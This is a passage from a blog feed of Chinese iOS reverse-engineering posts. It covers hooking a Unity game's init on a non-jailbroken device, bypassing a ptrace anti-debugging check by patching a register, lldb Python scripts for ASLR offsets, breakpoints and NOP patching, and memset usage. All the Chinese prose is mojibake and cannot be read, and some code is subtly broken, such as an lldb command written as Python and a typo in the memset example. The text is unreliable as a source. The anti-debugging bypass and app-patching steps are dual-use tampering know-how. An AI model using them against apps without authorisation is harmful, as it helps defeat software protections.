<p>é¦–å…ˆé€šè¿‡Class-dumpå°†å¤´æ–‡ä»¶dumpä¸‹æ¥ï¼Œåœ¨å…¶ä¸­å¯»æ‰¾ä¸€ä¸ªåˆä»£è¡¨æ€§çš„å‡½æ•°è¿›è¡ŒHookï¼Œæœ€ç»ˆå†³å®šhook UnityAppControllerè¿™ä¸ªç±»ä¸­çš„initå‡½æ•°ï¼Œåœ¨ä»–è°ƒç”¨çš„æ—¶å€™å¼¹å‡ºå¼¹æ¡†ã€‚</p>
<p>åœ¨your_projectDylib.xmä¸­Hookä»£ç å¦‚ä¸‹:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><div class="line"><span class="meta">#import <span class="meta-string">&lt;substrate.h&gt;</span></span></div><div class="line"><span class="meta">#import <span class="meta-string">&lt;sys/sysctl.h&gt;</span></span></div><div class="line"><span class="meta">#import <span class="meta-string">&lt;UIKit/UIKit.h&gt;</span></span></div><div class="line"></div><div class="line">%hook UnityAppController</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">// Hooking an instance method with an argument.</span></div><div class="line">- (<span class="keyword">void</span>)init&#123;</div><div class="line">%orig;</div><div class="line"></div><div class="line">UIAlertView *alert = [[UIAlertView alloc] initWithTitle:@<span class="string">"HookæˆåŠŸ"</span> message:nil delegate:self cancelButtonTitle:@<span class="string">"OK"</span> otherButtonTitles:nil];</div><div class="line">[alert show];</div><div class="line"><span class="comment">//[alert release];</span></div><div class="line">&#125;</div><div class="line"></div><div class="line">%end</div></pre></td></tr></table></figure>
<p>è¿è¡Œç¨‹åºå°†ipaè£…åˆ°æœªè¶Šç‹±æ‰‹æœºä¸Šï¼Œæ¸¸æˆæ‰“å¼€ä¹‹åä¼šæœ‰å¼¹æ¡†å‡ºç°</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook26.jpg" alt=""></p>
<h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>æœ¬æ¥å‡†å¤‡å†™ä¸€ç¯‡å…è¶Šç‹±Hookç»“åˆUnity3Dæ¸¸æˆä¿®æ”¹ä¸ºä¸€ä½“çš„æ–‡ç« ï¼Œä½†æ˜¯ä½†æ˜¯åœ¨Hook cå‡½æ•°çš„è¿‡ç¨‹ä¸­é‡åˆ°äº†éš¾é¢˜ï¼Œç›®å‰è¿˜æ²¡æœ‰æ‰¾åˆ°æœªè¶Šç‹±æ‰‹æœºä¸Šinlinhookçš„å¥½æ–¹æ¡ˆï¼Œåªèƒ½å°†ä¸¤è€…åˆ†å¼€æ¥å†™ï¼Œä¹‹åæ‰¾åˆ°å¥½çš„æ–¹æ¡ˆä¹‹åå†è¿›è¡Œä¿®æ”¹ä¸ºå¤§å®¶åˆ†äº«ã€‚</p>
<p>ä¸‹é¢é™„ä¸Šæœ¬äººiOS Unity3Då…¥é—¨çœ‹çš„ä¸€ç¯‡æ–‡ç« ï¼Œæœ¬æ–‡å¤§è‡´å‚è€ƒäº†è¿™ä½å¤§ä½¬çš„æ¡†æ¶ã€‚<a href="https://www.ichenxiaoyu.com/archero/#%E5%B7%A5%E5%85%B7" target="_blank" rel="external">iOSä¸Šçš„Unityé€†å‘ä¸å¼“ç®­ä¼ è¯´æ¸¸æˆä¿®æ”¹</a></p>
]]></content>
      <tags>
        <tag>iOS</tag>
        <tag>Hook</tag>
        <tag>Unity3D</tag>
      </tags>
  </entry>
  <entry>
    <title>iOSåè°ƒè¯•â€”â€”å†…åµŒæ±‡ç¼–æ–°å§¿åŠ¿</title>
    <url>/2021/01/11/iOS%E5%8F%8D%E8%B0%83%E8%AF%95%E2%80%94%E2%80%94%E5%86%85%E5%B5%8C%E6%B1%87%E7%BC%96%E6%96%B0%E5%A7%BF%E5%8A%BF/</url>
    <content><![CDATA[<p>ä¹‹å‰æœ‰è¿‡ä¸€ç¯‡ä¸“é—¨çš„iOSåè°ƒè¯•åŠå…¶ç»•è¿‡çš„æ–‡ç« ï¼ŒåŸæœ¬ä»¥ä¸ºå¸‚é¢ä¸Šèƒ½é‡åˆ°çš„åè°ƒè¯•å¯ä»¥ç»•è¿‡äº†ï¼Œä½†æ˜¯ä»Šå¤©é‡åˆ°äº†ç¡¬èŒ¬ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹ã€‚</p>
<a id="more"></a>
<h1 id="åè°ƒè¯•æƒ…å†µ"><a href="#åè°ƒè¯•æƒ…å†µ" class="headerlink" title="åè°ƒè¯•æƒ…å†µ"></a>åè°ƒè¯•æƒ…å†µ</h1><p>é¦–å…ˆç›´æ¥æ‰¾åè°ƒè¯•å‡½æ•°æ— æœï¼Œå…¨å±€æœç´¢SVC 0x80ï¼Œæ‰¾åˆ°ä¸‹å›¾ï¼Œæ˜æ˜¾æ˜¯åè°ƒè¯•ï¼Œå†…åµŒæ±‡ç¼–è°ƒç”¨ptraceï¼Œè¿™é‡Œæœ‰ä¸ªæ¯”è¾ƒå¥‡æ€ªçš„åœ°æ–¹ï¼Œåˆ¤æ–­å¹¶æ²¡æœ‰èµ°ä¸Šé¢çš„mac_syscallï¼Œè€Œæ˜¯è¿›å…¥ä¸‹é¢SDImageå‡½æ•°</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/Anit.png" alt=""></p>
<p>è°ƒè¯•å´©æºƒçš„åœ°æ–¹å®šä½åˆ°å¦‚ä¸‹åœ°å€ï¼ŒSVC 0x50ï¼Œå¦‚æœä½ ä»¥ä¸ºå’Œä¹‹å‰å¤„ç†SVC 0x80åªéœ€è¦nopæ‰å³å¯ï¼Œé‚£ä½ å¯å¤ªå¹´è½»äº†ï¼Œè¿™ä¸ªè°ƒç”¨ä¼šè¿”å›ä¸€ä¸ªç»“æ„ä½“ï¼Œåç»­æœ‰ä»£ç ä¼šå°†ä¸€äº›å€¼å†™å…¥è¿™ä¸ªç»“æ„ä½“ï¼Œå¦‚æœnopä¹‹åä¼šå‡ºç°æ— æ³•å†™å…¥æ”¹åœ°å€çš„æƒ…å†µã€‚</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/Anit1.png" alt=""></p>
<h1 id="ååè°ƒè¯•æ–¹æ³•"><a href="#ååè°ƒè¯•æ–¹æ³•" class="headerlink" title="ååè°ƒè¯•æ–¹æ³•"></a>ååè°ƒè¯•æ–¹æ³•</h1><p>ä¸Šè¿°æƒ…å†µè¯¥æ€ä¹ˆç»•è¿‡å‘¢ï¼ŒæŸ¥çœ‹åœ¨è°ƒç”¨SVC 0x50ä¹‹å‰x0å¯„å­˜å™¨çš„å€¼æ˜¯31ï¼Œè¿™ä¸ªåº”è¯¥æ˜¯åœ¨è°ƒç”¨ptraceï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¿®æ”¹è¿™ä¸ªå€¼å³å¯ï¼Œå°†å¯„å­˜å™¨x0ä¿®æ”¹ä¸º0ï¼Œå°±å¯ä»¥ç»•è¿‡è¿™ä¸ªåè°ƒè¯•ã€‚</p>
<p>æœ€åè®°å½•ä¸€ä¸‹å¦å¤–ä¸€ä¸ªæ”¶è·ï¼Œåœ¨æˆ‘ç»•è¿‡åè°ƒè¯•ä¹‹åå‘ç°APPéƒ¨åˆ†åŠŸèƒ½æ— æ³•ä½¿ç”¨äº†ï¼Œæ€€ç–‘è¿˜æœ‰å…¶ä»–æ£€æµ‹æ£€æµ‹åˆ°äº†è°ƒè¯•å™¨ï¼Œç›´æ¥é€šè¿‡iFunBoxæ›¿æ¢Libraryç›®å½•ï¼ˆå°†é‡è£…åçš„copyä¸‹æ¥ï¼Œç„¶åå‡ºé—®é¢˜äº†å°†å…¶æ›¿æ¢æ—¢å¯æ­£å¸¸ä½¿ç”¨ï¼‰</p>
]]></content>
      <tags>
        <tag>iOS</tag>
        <tag>åè°ƒè¯•</tag>
        <tag>ååè°ƒè¯•</tag>
      </tags>
  </entry>
  <entry>
    <title>lldb+pythonè®©è°ƒè¯•æ›´ç®€å•</title>
    <url>/2020/05/29/lldb-python%E8%AE%A9%E8%B0%83%E8%AF%95%E6%9B%B4%E7%AE%80%E5%8D%95/</url>
    <content><![CDATA[<p>æ€»æ‰€å‘¨çŸ¥ï¼Œç ¸å£³ä¹‹åçš„iOSåº”ç”¨åŠ¨æ€è°ƒè¯•ä¸€èˆ¬éƒ½ä½¿ç”¨lldbï¼Œç›¸è¾ƒäºAndroidé€šè¿‡ASåŠ¨æ€è°ƒè¯•smaliç•Œé¢åŒ–æ“ä½œï¼Œlldbçš„å‘½ä»¤è¡Œæ— ç–‘æ˜¾å¾—æ“ä½œç¹çè®¸å¤šã€‚ä½œä¸ºä¸€ä¸ªåˆæ ¼çš„æ‡’äººï¼Œè¿½æ±‚ç®€å•æ˜¯æˆ‘çš„æœ¬èƒ½ï¼Œç»è¿‡å¤šæ–¹èµ„æ–™çš„æ”¶é›†ï¼Œäº†è§£åˆ°lldb+pythonå¯æå¤§çš„æé«˜lldbåŠ¨æ€è°ƒè¯•æ•ˆç‡ã€‚ç®€å•æ•´ç†å‡ºlldb+pythonæé«˜iOSåŠ¨æ€è°ƒè¯•æ•ˆç‡çš„å‡ ä¸ªå‡½æ•°ã€‚<br><a id="more"></a></p>
<h1 id="lldbè„šæœ¬æ¡¥æ¥"><a href="#lldbè„šæœ¬æ¡¥æ¥" class="headerlink" title="lldbè„šæœ¬æ¡¥æ¥"></a>lldbè„šæœ¬æ¡¥æ¥</h1><p>LLDBçš„è„šæœ¬æ¡¥æ¥æ˜¯è°ƒè¯•å™¨çš„ä¸€ä¸ªPythonæ¥å£ã€‚é€šè¿‡è¿™ä¸ªæ¥å£å¯ä»¥åœ¨LLDBä¸­åŠ è½½å’Œæ‰§è¡ŒPythonä»£ç ã€‚åœ¨Pythonä»£ç ä¸­ï¼Œä½ å¯ä»¥å¼•å…¥lldbæ¨¡å—æ¥ä¸è°ƒè¯•å™¨äº¤äº’æ¥è·å–å„ç§ä¿¡æ¯ï¼ˆæ¯”å¦‚å‘½ä»¤çš„å‚æ•°ç­‰ï¼‰ã€‚</p>
<p>é¦–å…ˆå¯ä»¥é€šè¿‡scriptå‘½ä»¤ç›´æ¥æ‰“å¼€lldbä¸­çš„pythonè§£é‡Šå™¨ï¼Œscriptå‘½ä»¤æ·»åŠ å„ç§å‚æ•°å³å¯è¿›è¡Œæ¡¥æ¥ã€‚</p>
<p>æŸ¥çœ‹pythonç‰ˆæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">$ lldb</div><div class="line">(lldb) script <span class="keyword">import</span> sys</div><div class="line">(lldb) script <span class="keyword">print</span> (sys.version)</div><div class="line"><span class="number">2.7</span><span class="number">.10</span> (default, Feb <span class="number">22</span> <span class="number">2019</span>, <span class="number">21</span>:<span class="number">17</span>:<span class="number">52</span>) </div><div class="line">[GCC <span class="number">4.2</span><span class="number">.1</span> Compatible Apple LLVM <span class="number">10.0</span><span class="number">.1</span> (clang<span class="number">-1001.0</span><span class="number">.37</span><span class="number">.14</span>)]</div></pre></td></tr></table></figure>
<h1 id="Helloword"><a href="#Helloword" class="headerlink" title="Helloword"></a>Helloword</h1><p>é¦–å…ˆæ–°å»ºä¸€ä¸ªç›®å½•å­˜æ”¾ä½ çš„lldb Pythonè„šæœ¬ï¼Œæ¯”å¦‚æˆ‘æŠŠå®ƒæ”¾åœ¨~/lldbä¸­ï¼Œè¯¥ç›®å½•ä¸‹æ–°å»ºHelloWorld.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">helloworld</span><span class="params">(debugger, command, result, internal_dict)</span>:</span></div><div class="line">    print(<span class="string">"hello world!"</span>)</div></pre></td></tr></table></figure>
<p>åœ¨lldbä¸­è¾“å…¥ä»¥ä¸‹å‘½ä»¤å³å¯ä½¿ç”¨ä¸Šè¿°Pythonä»£ç </p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">(lldb) command script <span class="keyword">import</span> ~/lldb/HelloWorld.py</div><div class="line">(lldb) command script add -f HelloWorld.helloworld hello</div><div class="line">(lldb) hello</div><div class="line">hello world!</div></pre></td></tr></table></figure>
<p>ä½†æ˜¯æ¯æ¬¡è¾“å…¥è¿™ä¹ˆç¹ççš„å‘½ä»¤æ˜æ˜¾ä¸æ˜¯æˆ‘ä»¬çš„åˆè¡·ï¼Œllldbæœ‰ä¸ªå‡½æ•°lldb_init_moduleï¼Œä¸€æ—¦Pythonæ¨¡å—è¢«åŠ è½½åˆ°LLDBä¸­æ—¶å®ƒå°±ä¼šè¢«è°ƒç”¨ã€‚å› æ­¤åªè¦æˆ‘ä»¬åœ¨è¿™ä¸ªå‡½æ•°é‡Œé¢å°†helloworldå®‰è£…åˆ°LLDBé‡Œé¢å».</p>
<p>åœ¨HelloWorld.pyä¸­åŠ å…¥ä¸‹é¢çš„ä»£ç </p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">__lldb_init_module</span><span class="params">(debugger, internal_dict)</span>:</span></div><div class="line">    command script add -f HelloWorld.helloworld hello</div></pre></td></tr></table></figure>
<p>ç„¶ååœ¨~/.lldbinitä¸­importè¿™ä¸ªè„šæœ¬ï¼Œå¦‚æœæ²¡æœ‰.lldbinitè¿™ä¸ªæ–‡ä»¶ï¼Œtouch ~/.lldbinitæ–°å»ºä¸€ä¸ªå³å¯</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">command script <span class="keyword">import</span> ~/lldb/HelloWorld.py</div></pre></td></tr></table></figure>
<p>è¿™æ ·åœ¨åŠ è½½lldbä¹‹åè¾“å…¥helloç›´æ¥ä¼šè¾“å‡ºhelloworldäº†ã€‚</p>
<h1 id="åˆ†äº«è„šæœ¬-æŒç»­æ›´æ–°"><a href="#åˆ†äº«è„šæœ¬-æŒç»­æ›´æ–°" class="headerlink" title="åˆ†äº«è„šæœ¬(æŒç»­æ›´æ–°)"></a>åˆ†äº«è„šæœ¬(æŒç»­æ›´æ–°)</h1><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># !/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="keyword">import</span> lldb</div><div class="line"><span class="keyword">import</span> re</div><div class="line"></div><div class="line"><span class="comment"># è·å–ASLRåç§»åœ°å€</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">fy_get_ASLR</span><span class="params">(debugger, command, result, internal_dict)</span>:</span></div><div class="line">    <span class="comment"># è·å–'image list -o'å‘½ä»¤çš„è¿”å›ç»“æœ</span></div><div class="line">    interpreter = lldb.debugger.GetCommandInterpreter()</div><div class="line">    returnObject = lldb.SBCommandReturnObject()</div><div class="line">    interpreter.HandleCommand(<span class="string">'image list -o'</span>, returnObject)</div><div class="line">    output = returnObject.GetOutput()</div><div class="line">    <span class="comment"># æ­£åˆ™åŒ¹é…å‡ºç¬¬ä¸€ä¸ª0xå¼€å¤´çš„16è¿›åˆ¶åœ°å€</span></div><div class="line">    match = re.match(<span class="string">r'.+(0x[0-9a-fA-F]+)'</span>, output)</div><div class="line">    <span class="keyword">if</span> match:</div><div class="line">        <span class="keyword">print</span> match.group(<span class="number">1</span>)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">return</span> <span class="keyword">None</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_ASLR</span><span class="params">()</span>:</span></div><div class="line">    <span class="comment"># è·å–'image list -o'å‘½ä»¤çš„è¿”å›ç»“æœ</span></div><div class="line">    interpreter = lldb.debugger.GetCommandInterpreter()</div><div class="line">    returnObject = lldb.SBCommandReturnObject()</div><div class="line">    interpreter.HandleCommand(<span class="string">'image list -o'</span>, returnObject)</div><div class="line">    output = returnObject.GetOutput();</div><div class="line">    <span class="comment"># æ­£åˆ™åŒ¹é…å‡ºç¬¬ä¸€ä¸ª0xå¼€å¤´çš„16è¿›åˆ¶åœ°å€</span></div><div class="line">    match = re.match(<span class="string">r'.+(0x[0-9a-fA-F]+)'</span>, output)</div><div class="line">    <span class="keyword">if</span> match:</div><div class="line">        <span class="keyword">return</span> match.group(<span class="number">1</span>)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">return</span> <span class="keyword">None</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">process_conn</span><span class="params">(debugger, command, result, internal_dict)</span>:</span></div><div class="line">    <span class="comment"># è·å–'image list -o'å‘½ä»¤çš„è¿”å›ç»“æœ</span></div><div class="line">    interpreter = lldb.debugger.GetCommandInterpreter()</div><div class="line">    returnObject = lldb.SBCommandReturnObject()</div><div class="line">    interpreter.HandleCommand(<span class="string">'process connect connect://127.0.0.1:12345'</span>, returnObject)</div><div class="line">    output = returnObject.GetOutput()</div><div class="line"></div><div class="line"></div><div class="line"> <span class="comment"># Super breakpoint</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sbr</span><span class="params">(debugger, command, result, internal_dict)</span>:</span></div><div class="line"></div><div class="line">    <span class="comment">#ç”¨æˆ·æ˜¯å¦è¾“å…¥äº†åœ°å€å‚æ•°</span></div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> command:</div><div class="line">        <span class="keyword">print</span> &gt;&gt;result, <span class="string">'Please input the address!'</span></div><div class="line">        <span class="keyword">return</span></div><div class="line"></div><div class="line">    ASLR = get_ASLR()</div><div class="line">    <span class="keyword">if</span> ASLR:</div><div class="line">        <span class="comment">#å¦‚æœæ‰¾åˆ°äº†ASLRåç§»ï¼Œå°±è®¾ç½®æ–­ç‚¹</span></div><div class="line">        debugger.HandleCommand(<span class="string">'br set -a "%s+0x%s"'</span> % (ASLR, command))</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">print</span> &gt;&gt;result, <span class="string">'ASLR not found!'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">nop_add</span><span class="params">(debugger, command, result, internal_dict)</span>:</span></div><div class="line">    </div><div class="line">    <span class="comment">#ç”¨æˆ·æ˜¯å¦è¾“å…¥äº†åœ°å€å‚æ•°</span></div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> command:</div><div class="line">        <span class="keyword">print</span> &gt;&gt;result, <span class="string">'Please input the address!'</span></div><div class="line">        <span class="keyword">return</span></div><div class="line">    </div><div class="line">    ASLR = get_ASLR()</div><div class="line">    <span class="keyword">if</span> ASLR:</div><div class="line">        <span class="comment">#å¦‚æœæ‰¾åˆ°äº†ASLRåç§»ï¼Œå°±è®¾ç½®æ–­ç‚¹</span></div><div class="line">        debugger.HandleCommand(<span class="string">'memory write "%s+0x%s" 0x1F 0x20 0x03 0xD5'</span> % (ASLR, command))</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">print</span> &gt;&gt;result, <span class="string">'ASLR not found!'</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_base_add</span><span class="params">(debugger, command, result, internal_dict)</span>:</span></div><div class="line">    </div><div class="line">    <span class="comment">#ç”¨æˆ·æ˜¯å¦è¾“å…¥äº†åœ°å€å‚æ•°</span></div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> command:</div><div class="line">        <span class="keyword">print</span> &gt;&gt;result, <span class="string">'Please input the address!'</span></div><div class="line">        <span class="keyword">return</span></div><div class="line">    </div><div class="line">    ASLR = get_ASLR()</div><div class="line">    <span class="keyword">if</span> ASLR:</div><div class="line">        <span class="comment">#å¦‚æœæ‰¾åˆ°äº†ASLRåç§»ï¼Œå°±è®¾ç½®æ–­ç‚¹</span></div><div class="line">        <span class="keyword">print</span> hex(int(command, <span class="number">16</span>) - int(ASLR, <span class="number">16</span>))</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">print</span> &gt;&gt;result, <span class="string">'ASLR not found!'</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">watch_point</span><span class="params">(debugger, command, result, internal_dict)</span>:</span></div><div class="line">    <span class="comment">#ç”¨æˆ·æ˜¯å¦è¾“å…¥äº†åœ°å€å‚æ•°</span></div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> command:</div><div class="line">        <span class="keyword">print</span> &gt;&gt;result, <span class="string">'Please input the address!'</span></div><div class="line">        <span class="keyword">return</span></div><div class="line">	debugger.HandleCommand(<span class="string">'watchpoint set expression "%s"'</span> % (command))</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">watch_read_point</span><span class="params">(debugger, command, result, internal_dict)</span>:</span></div><div class="line">    <span class="comment">#ç”¨æˆ·æ˜¯å¦è¾“å…¥äº†åœ°å€å‚æ•°</span></div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> command:</div><div class="line">        <span class="keyword">print</span> &gt;&gt;result, <span class="string">'Please input the address!'</span></div><div class="line">        <span class="keyword">return</span></div><div class="line"></div><div class="line">	debugger.HandleCommand(<span class="string">'watchpoint set expression -w read -- "%s"'</span> % (command))</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">__lldb_init_module</span><span class="params">(debugger, internal_dict)</span>:</span></div><div class="line">    <span class="comment">#è·å–åç§»åœ°å€</span></div><div class="line">    debugger.HandleCommand(<span class="string">'command script add -f helloworld.fy_get_ASLR pianyi'</span>)</div><div class="line">    <span class="comment"># 'command script add sbr' : ç»™lldbå¢åŠ ä¸€ä¸ª'sbr'å‘½ä»¤</span></div><div class="line">    <span class="comment"># '-f sbr.sbr' : è¯¥å‘½ä»¤è°ƒç”¨äº†sbræ–‡ä»¶çš„sbrå‡½æ•°</span></div><div class="line">    debugger.HandleCommand(<span class="string">'command script add sbr -f helloworld.sbr'</span>)</div><div class="line">    <span class="comment">#æŒ‚è½½è¿›ç¨‹è¿æ¥</span></div><div class="line">    debugger.HandleCommand(<span class="string">'command script add -f helloworld.process_conn pp'</span>)</div><div class="line">    <span class="comment">#å†…å­˜è¯»æ–­ç‚¹</span></div><div class="line">    debugger.HandleCommand(<span class="string">'command script add mw -f helloworld.watch_point'</span>)</div><div class="line">	<span class="comment">#å†…å­˜è®¿é—®æ–­ç‚¹</span></div><div class="line">    debugger.HandleCommand(<span class="string">'command script add mr -f helloworld.watch_read_point'</span>)</div><div class="line">	<span class="comment">#è·å–å®é™…åœ°å€</span></div><div class="line">    debugger.HandleCommand(<span class="string">'command script add gba -f helloworld.get_base_add'</span>)</div><div class="line">	<span class="comment">#nopæ±‡ç¼–æŒ‡ä»¤</span></div><div class="line">    debugger.HandleCommand(<span class="string">'command script add nop -f helloworld.nop_add'</span>)</div></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>iOS</tag>
        <tag>Debug</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>memsetå‡½æ•°çš„ç”¨æ³•</title>
    <url>/2016/10/26/memset%E5%87%BD%E6%95%B0%E7%9A%84%E7%94%A8%E6%B3%95/</url>
    <content><![CDATA[<p>åœ¨é€šè¿‡IDAé€†å‘ä¼ªä»£ç åˆ†æç¨‹åºçš„æ—¶å€™ï¼Œç»å¸¸ä¼šé‡åˆ°memset()è¿™ä¸ªå‡½æ•°ï¼Œæ ¼å¼ä¸€èˆ¬å¦‚ä¸‹æ‰€ç¤ºï¼š<br><a id="more"></a></p>
<pre><code>memset(&amp;v1, 0, 0x80u);
</code></pre><p>ä¸€ç›´ä»¥ä¸ºæ˜¯å¼€è¾Ÿä¸€ä¸ªå †æ ˆç©ºé—´ï¼ŒçŸ¥é“ä»Šå¤©ä¸“é—¨çœ‹äº†åˆ«äººå†™çš„åšå®¢æ‰çŸ¥é“è‡ªå·±å¤§é”™ç‰¹é”™ï¼Œæ¥ä¸‹æ¥å°±æˆ‘å­¦ä¹ åˆ°çš„ç›¸å…³çŸ¥è¯†åšä¸€ä¸ªæ€»ç»“ã€‚</p>
<p>memset()çš„å‡½æ•°ï¼Œ å®ƒå¯ä»¥ä¸€å­—èŠ‚ä¸€å­—èŠ‚åœ°æŠŠæ•´ä¸ªæ•°ç»„è®¾ç½®ä¸ºä¸€ä¸ªæŒ‡å®šçš„å€¼ã€‚ </p>
<pre><code>#include &lt;mem.h&gt; 
void* memset(void* s, int c, size_t n)
{
    unsigned char* p = (unsigned char*) s;
    while (n &gt; 0) {
    *p++ = (unsigned char) c;
    --n;
    }
    return s;
} 
</code></pre><p>memset()å‡½æ•°åœ¨mem.hå¤´æ–‡ä»¶ä¸­å£°æ˜ï¼Œå®ƒæŠŠæ•°ç»„çš„èµ·å§‹åœ°å€ä½œä¸ºå…¶ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯è®¾ç½®æ•°ç»„æ¯ä¸ªå­—èŠ‚çš„å€¼ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯æ•°ç»„çš„é•¿åº¦(å­—èŠ‚æ•°ï¼Œä¸æ˜¯å…ƒç´ ä¸ªæ•°)ã€‚</p>
<p>å…¶å‡½æ•°åŸå‹ä¸ºï¼š</p>
<pre><code>void *memset(void*ï¼Œintï¼Œunsigned)ï¼›å…¶ä¸­void*è¡¨ç¤ºåœ°å€ã€‚
</code></pre><p>ã€€ã€€ä¾‹å¦‚ï¼Œä¸‹é¢çš„ä»£ç ç”¨æ•°ç»„åšå‚æ•°ä¼ é€’ç»™æ ‡å‡†å‡½æ•°memset()ï¼Œä»¥è®©å…¶å°†æ•°ç»„è®¾ç½®æˆå…¨0ï¼š</p>
<pre><code>ã€€#include&lt;mem.h&gt;
ã€€void main()
ã€€{
ã€€ã€€int ia1[50]ï¼›
ã€€ã€€int ia2[500]ï¼›
ã€€ã€€memset(iai,0,50*sizeof(int))ï¼›
ã€€ã€€memset(ia2,0,500*sizeof(int))ï¼›
ã€€ã€€//
ã€€}
</code></pre><p>ã€€ã€€memset()çš„ç¬¬ä¸€ä¸ªå®å‚æ˜¯æ•°ç»„åï¼Œæ•°ç»„åä½œå‚æ•°å³æ•°ç»„ä½œå‚æ•°ï¼Œå®ƒä»…ä»…åªæ˜¯ä¸€ä¸ªæ•°ç»„çš„èµ·å§‹åœ°å€è€Œå·²ã€‚</p>
<p>ã€€ã€€åœ¨å‡½æ•°memset()æ ˆåŒºï¼Œä»è¿”å›åœ°å€å¾€ä¸Šä¾æ¬¡ä¸ºç¬¬1ï¼Œ2ï¼Œ3ä¸ªå‚æ•°ã€‚ç¬¬1ä¸ªå‚æ•°ä¸­çš„å†…å®¹æ˜¯main()å‡½æ•°ä¸­å®šä¹‰çš„æ•°ç»„ia1çš„èµ·å§‹åœ°å€ã€‚ç¬¬2ä¸ªå‚æ•°æ˜¯ç»™æ•°ç»„è®¾ç½®çš„å€¼(0)ï¼Œç¬¬3ä¸ªå‚æ•°æ˜¯æ•°ç»„çš„é•¿åº¦(50*2)ã€‚å‡½æ•°è¿”å›æ—¶ï¼Œmain()å‡½æ•°çš„æ•°ç»„ä¸­å†…å®¹å…¨ç½®ä¸º0ã€‚</p>
<pre><code>0x00ã€void *memset(void *s,int c,size_t n)
æ€»çš„ä½œç”¨ï¼šå°†å·²å¼€è¾Ÿå†…å­˜ç©ºé—´ s çš„é¦– n ä¸ªå­—èŠ‚çš„å€¼è®¾ä¸ºå€¼ cã€‚

0x01ã€ä¾‹å­
ï¼ƒinclude

void main(){
char *s=&quot;Golden Global View&quot;;

clrscr();

memset(s,&apos;G&apos;,6);
printf(&quot;%s&quot;,s);

getchar();
return 0;
}ã€€

0x02ã€memset() å‡½æ•°å¸¸ç”¨äºå†…å­˜ç©ºé—´åˆå§‹åŒ–ã€‚å¦‚ï¼š
char str[100];
memset(str,0,100);

0x03ã€memset()çš„æ·±åˆ»å†…æ¶µï¼šç”¨æ¥å¯¹ä¸€æ®µå†…å­˜ç©ºé—´å…¨éƒ¨è®¾ç½®ä¸ºæŸä¸ªå­—
ç¬¦ï¼Œä¸€èˆ¬ç”¨åœ¨å¯¹å®šä¹‰çš„å­—ç¬¦ä¸²è¿›è¡Œåˆå§‹åŒ–ä¸ºâ€˜ â€™æˆ–â€˜\0â€™ï¼›
ä¾‹:char a[100];memset(a, &apos;\0&apos;, sizeof(a));

memcpyç”¨æ¥åšå†…å­˜æ‹·è´ï¼Œä½ å¯ä»¥æ‹¿å®ƒæ‹·è´ä»»ä½•æ•°æ®ç±»å‹çš„å¯¹è±¡ï¼Œå¯ä»¥
æŒ‡å®šæ‹·è´çš„æ•°æ®é•¿åº¦ï¼›ä¾‹ï¼šchar a[100],b[50]; memcpy(b, a, sizeof(b));
æ³¨æ„å¦‚ç”¨sizeof(a)ï¼Œä¼šé€ æˆbçš„å†…å­˜åœ°å€æº¢å‡ºã€‚

strcpyå°±åªèƒ½æ‹·è´å­—ç¬¦ä¸²äº†ï¼Œå®ƒé‡åˆ°&apos;\0&apos;å°±ç»“æŸæ‹·è´ï¼›
ä¾‹ï¼šchar a[100],b[50];strcpy(a,b);å¦‚ç”¨strcpy(b,a)ï¼Œ
è¦æ³¨æ„aä¸­çš„å­—ç¬¦ä¸²é•¿åº¦ï¼ˆç¬¬ä¸€ä¸ªâ€˜\0â€™ä¹‹å‰ï¼‰æ˜¯å¦è¶…è¿‡50ä½ï¼Œå¦‚è¶…è¿‡ï¼Œåˆ™ä¼šé€ æˆbçš„å†…å­˜åœ°å€æº¢å‡ºã€‚

0x04ã€memsetå¯ä»¥æ–¹ä¾¿çš„æ¸…ç©ºä¸€ä¸ªç»“æ„ç±»å‹çš„å˜é‡æˆ–æ•°ç»„ã€‚

